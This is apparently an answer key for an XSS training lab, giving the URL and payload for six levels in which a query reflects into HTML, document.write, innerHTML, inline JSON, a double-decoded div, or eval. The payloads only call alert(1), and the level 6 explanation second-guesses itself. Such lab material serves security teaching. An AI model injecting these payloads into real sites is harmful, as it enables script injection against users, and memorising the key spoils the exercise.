# domctx — solutions

Server reflections that land in JS strings, JSON, eval, or div bodies (DOM contexts).

### domctx-level1

`/domctx/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in div body

### domctx-level2

`/domctx/level2/?query=%3C/script%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: inside document.write("..."); close `<script>` then inject HTML

### domctx-level3

`/domctx/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: inside innerHTML = "..."; JS string is then HTML-parsed

### domctx-level4

`/domctx/level4/?query=%3C/script%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: inside `<script>var config={"name":"..."}</script>`; close script

### domctx-level5

`/domctx/level5/?query=%253Cscript%253Ealert(1)%253C/script%253E`

- payload: URL-encoded `<script>alert(1)</script>`
- context: server URI.decode then div body — double-encode so it survives once

### domctx-level6

`/domctx/level6/?query=alert(1)//`

- payload: `alert(1)//`
- context: inside eval("..."); break double-quoted JS string? Actually eval("alert(1)//") executes directly — payload is JS body
